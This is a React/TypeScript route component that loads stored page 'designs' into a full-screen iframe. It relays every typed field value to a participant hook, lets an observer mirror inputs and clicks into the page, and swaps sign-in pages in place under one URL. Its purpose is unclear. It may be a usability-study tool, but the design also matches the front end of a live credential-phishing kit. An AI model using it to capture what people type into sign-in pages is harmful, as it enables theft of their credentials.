import { createFileRoute, notFound } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { useParticipant } from "@/hooks/useParticipant";
import {
  buildSrcDocCached,
  buildSrcDocVirtual,
  designFaviconLinks,
  getPageMeta,
  remoteHydrated,
  subscribeDesignChanges,
  type DesignKey,
  type PageKey,
} from "@/lib/designStore";

const SLUG = /^[a-z][a-z0-9_-]{0,40}$/;

export const Route = createFileRoute("/$theme/$page")({
  head: ({ params }) => {
    const theme = params.theme;
    const page = params.page;
    const pm =
      SLUG.test(theme) && SLUG.test(page) && page !== "shared"
        ? getPageMeta(theme, page)
        : {};
    return {
      meta: [{ title: (pm.title ?? "").trim() || "Controlled Suite" }],
      links: designFaviconLinks(theme, page),
    };
  },
  component: SuiteView,
});

function SuiteView() {
  const { theme, page } = Route.useParams();
  if (!SLUG.test(theme) || !SLUG.test(page) || page === "shared") {
    throw notFound();
  }
  const design = theme as DesignKey;
  const pageKey = page as PageKey;

  const { emitInput } = useParticipant();
  const emitInputRef = useRef(emitInput);
  emitInputRef.current = emitInput;

  const [hydrated, setHydrated] = useState(false);
  const [srcDoc, setSrcDoc] = useState<string>("");
  const [version, setVersion] = useState(0);
  const [virtualPage, setVirtualPage] = useState<PageKey | null>(null);
  const iframeRef = useRef<HTMLIFrameElement>(null);

  // Reset virtual view whenever the real route changes.
  useEffect(() => { setVirtualPage(null); }, [design, pageKey]);

  // One-time hydration wait.
  useEffect(() => {
    let cancelled = false;
    void remoteHydrated.then(() => {
      if (!cancelled) setHydrated(true);
    });
    return () => {
      cancelled = true;
    };
  }, []);

  // Build srcDoc per design/page (or virtual page).
  useEffect(() => {
    if (!hydrated) return;
    const doc = virtualPage
      ? buildSrcDocVirtual(design, virtualPage, virtualPage)
      : buildSrcDocCached(design, pageKey);
    setSrcDoc(doc);
    setVersion((v) => v + 1);
  }, [hydrated, design, pageKey, virtualPage]);

  // Live-reload on remote/local edits (no fade — instant swap).
  useEffect(() => {
    if (!hydrated) return;
    const activePage = virtualPage || pageKey;
    const ch = subscribeDesignChanges(
      (d, p) => d === design && (p === activePage || p === "shared"),
      () => {
        const doc = virtualPage
          ? buildSrcDocVirtual(design, virtualPage, virtualPage)
          : buildSrcDocCached(design, pageKey);
        setSrcDoc(doc);
        setVersion((v) => v + 1);
      },
    );
    return () => {
      void ch.unsubscribe();
    };
  }, [design, pageKey, virtualPage, hydrated]);

  useEffect(() => {
    function onMsg(e: MessageEvent) {
      const d = e.data;
      if (!d || typeof d !== "object") return;
      if (d.__ux === true && d.type === "input" && typeof d.field === "string") {
        emitInputRef.current(
          d.field,
          typeof d.value === "string" ? d.value : "",
        );
        return;
      }
      // In-place virtual page swap (cb signin -> signinp under same URL).
      if (d.__ux === true && d.type === "swap_virtual" && typeof d.page === "string") {
        if (d.design === design) setVirtualPage(d.page as PageKey);
        return;
      }
      // Observer → forward live_input / click down into the inner srcDoc iframe.
      if (d.__mirror === true && (d.type === "live_input" || d.type === "click")) {
        const win = iframeRef.current?.contentWindow;
        if (win) {
          try { win.postMessage(d, "*"); } catch { /* ignore */ }
        }
      }
    }
    window.addEventListener("message", onMsg);
    return () => window.removeEventListener("message", onMsg);
  }, [design]);

  return (
    <div style={{ position: "fixed", inset: 0, background: "#0a0b0d" }}>
      {hydrated && srcDoc && (
        <iframe
          ref={iframeRef}
          key={version}
          title="design"
          srcDoc={srcDoc}
          style={{
            position: "fixed",
            inset: 0,
            width: "100%",
            height: "100%",
            border: 0,
          }}
        />
      )}
    </div>
  );
}


